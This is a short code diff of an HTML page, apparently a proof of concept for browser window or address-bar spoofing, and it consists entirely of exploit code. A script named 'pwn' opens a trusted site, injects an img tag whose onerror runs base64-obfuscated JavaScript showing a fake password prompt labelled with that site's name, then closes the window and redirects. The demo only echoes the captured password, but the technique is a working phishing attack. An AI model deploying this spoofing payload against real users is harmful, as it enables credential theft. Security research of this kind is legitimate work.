@@ -10,13 +10,13 @@
 </head>
 <script>
     pwn = () => {
-        x = open('https://test.baidu.com', 'win');
+        x = open('https://www.amazon.com', 'win');
         setTimeout(`
             x.document.write('<img src=@ onerror=eval(atob("dmFyIHB3ZD1wcm9tcHQoImh0dHBzOi8vdGVzdC5iYWlkdS5jb21cbmlucHV0IHlvdXIgcGFzc3dvcmRcbnRlc3QuLi4iKTtpZihwd2Qpe2FsZXJ0KCJwYXNzd29yZDogIitwd2QpfQ=="))><a href="https://google.com/" id="test">test</a>');
             `, 1000);
         setTimeout(`
             x.close();
-            window.location='http://www.google.com:1234';
+            window.location='https://wrong.host.badssl.com/';
             `, 1300);
     }
 </script>
